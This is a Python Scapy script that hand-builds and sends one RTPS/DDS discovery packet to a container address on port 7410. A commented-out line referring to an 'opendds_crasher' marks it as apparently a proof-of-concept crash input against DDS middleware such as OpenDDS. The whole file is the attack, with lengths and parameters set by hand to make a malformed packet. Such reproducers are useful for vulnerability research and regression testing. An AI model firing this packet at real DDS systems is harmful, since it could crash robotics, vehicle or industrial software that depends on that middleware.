from scapy.all import *
from scapy.layers.inet import UDP, IP
from scapy.contrib.rtps import *

bind_layers(UDP, RTPS)
conf.verb = 0


PARAMETER_DATA = b"\x00\x00\x00\x00,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1d\x00\x00\x00test.local/0.9.0/Linux/Linux\x00\x00\x00\x00"  # noqa E501
src = "172.17.0.1"
dst = "172.17.0.2"
sport = 17900
dport = 7410

src_port = sport
src_ip = src

pkt = (
    IP(
        version=4,
        ihl=5,
        tos=0,
        len=82,
        flags=2,
        frag=0,
        ttl=64,
        proto=17,
        dst=dst,
    )
    / UDP(sport=sport, dport=dport, len=62)
    / RTPS(
        protocolVersion=ProtocolVersionPacket(major=2, minor=1),
        vendorId=VendorIdPacket(vendor_id=b"\x01\x10"),
        guidPrefix=GUIDPrefixPacket(
            hostId=17849486, appId=752113735, instanceId=4200214739
        ),
        magic=b"RTPS",
    )
    / RTPSMessage(
        submessages=[
            RTPSSubMessage_INFO_TS(
                submessageId=9,
                submessageFlags=1,
                octetsToNextHeader=8,
                ts_seconds=1635160430,
                ts_fraction=3848061961,
            ),
            RTPSSubMessage_DATA(
                submessageId=21,
                submessageFlags=5,
                octetsToNextHeader=248,
                extraFlags=0,
                octetsToInlineQoS=16,
                readerEntityIdKey=0,
                readerEntityIdKind=0,
                writerEntityIdKey=256,
                writerEntityIdKind=194,
                writerSeqNumHi=0,
                writerSeqNumLow=1,
                data=DataPacket(
                    encapsulationKind=3,
                    encapsulationOptions=0,
                    parameterList=ParameterListPacket(
                        parameterValues=[
                            PID_USER_DATA(
                                parameterId=44,
                                parameterLength=28,
                                parameterData=b"\x17\x00\x00\x00DDSPerf:0:58:test.local\x00",  # noqa E501
                            ),
                            PID_PROTOCOL_VERSION(
                                parameterId=21,
                                parameterLength=4,
                                protocolVersion=ProtocolVersionPacket(major=2, minor=1),
                                padding=b"\x00\x00",
                            ),
                            PID_VENDOR_ID(
                                parameterId=22,
                                parameterLength=4,
                                vendorId=VendorIdPacket(vendor_id=b"\x01\x10"),
                                padding=b"\x00\x00",
                            ),
                            PID_PARTICIPANT_LEASE_DURATION(
                                parameterId=2,
                                parameterLength=8,
                                parameterData=b"\x00\x00\x00\x008\x89A\x00",  # noqa E501
                            ),
                            PID_PARTICIPANT_GUID(
                                parameterId=80,
                                parameterLength=16,
                                parameterData=b"\x01\x10\\\x8e,\xd4XG\xfaZ0\xd3\x00\x00\x01\xc1",  # noqa E501
                            ),
                            PID_BUILTIN_ENDPOINT_SET(
                                parameterId=88,
                                parameterLength=4,
                                parameterData=b"\x00\x00\x00\x00",
                            ),
                            PID_DOMAIN_ID(
                                parameterId=15,
                                parameterLength=4,
                                parameterData=b"\x00\x00\x00\x00",
                            ),
                            PID_DEFAULT_UNICAST_LOCATOR(
                                parameterId=49,
                                parameterLength=24,
                                locator=LocatorPacket(
                                    locatorKind=16777216,
                                    port=src_port,
                                    address=src_ip,
                                ),
                            ),
                            PID_METATRAFFIC_UNICAST_LOCATOR(
                                parameterId=50,
                                parameterLength=24,
                                locator=LocatorPacket(
                                    locatorKind=16777216, port=src_port, address=src_ip
                                ),
                            ),
                            PID_UNKNOWN(
                                parameterId=32775,
                                parameterLength=56,
                                parameterData=PARAMETER_DATA,
                            ),
                            PID_UNKNOWN(
                                parameterId=32793,
                                parameterLength=4,
                                parameterData=b"\x00\x80\x06\x00",
                            ),
                        ],
                        sentinel=PID_SENTINEL(parameterId=1, parameterLength=0),
                    ),
                ),
            ),
        ]
    )
)

# send(opendds_crasher, iface="eth0")
send(pkt)
